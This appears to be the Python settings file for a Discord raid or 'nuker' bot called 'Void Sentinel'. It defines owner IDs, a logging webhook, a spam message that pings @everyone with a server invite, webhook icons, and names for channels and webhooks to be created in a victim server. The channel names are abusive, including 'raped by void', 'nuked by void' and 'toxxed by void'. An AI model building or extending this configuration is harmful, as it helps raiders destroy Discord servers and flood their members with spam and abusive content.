import os

from dotenv import load_dotenv

load_dotenv()

NAME = "Void Sentinel" # your server name
OWNER_IDS = [1178569191276664842, 1470775670262202590] # dennis? and voby
LOG_WEBHOOK = os.getenv("LOG_WEBHOOK", "") # make .env with LOG_WEBHOOK
DEFAULT_BL_GUILD = [1531718828575424643] # vsentinel guild id
SERVER_INVITE = "https://discord.gg/Ym6zpgrJPh"

SPAMMSG = f"""
||@everyone|| BEST BOTS?? JOIN VOID SENTINEL
{SERVER_INVITE}
""" # server invite ^^

WEBICON = [
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f921.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f480.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/26a1.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f479.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f44f.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f47a.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1faa6.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f4a5.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f4e2.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f5a4.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f525.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f3af.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f300.png",
    "https://raw.githubusercontent.com/twitter/twemoji/master/assets/72x72/1f32a.png",
]

CHANNEL_NAME = [
    f"「🖤」raped by void",
    f"「😂」nuked by void",
    f"「📢」fucked by void",
    f"「👹」obliterated by void",
    f"「💀」clowned by void",
    f"「💣」swirled by void",
    f"「👺」toxxed by void",
    ]

WEBNAME = CHANNEL_NAME
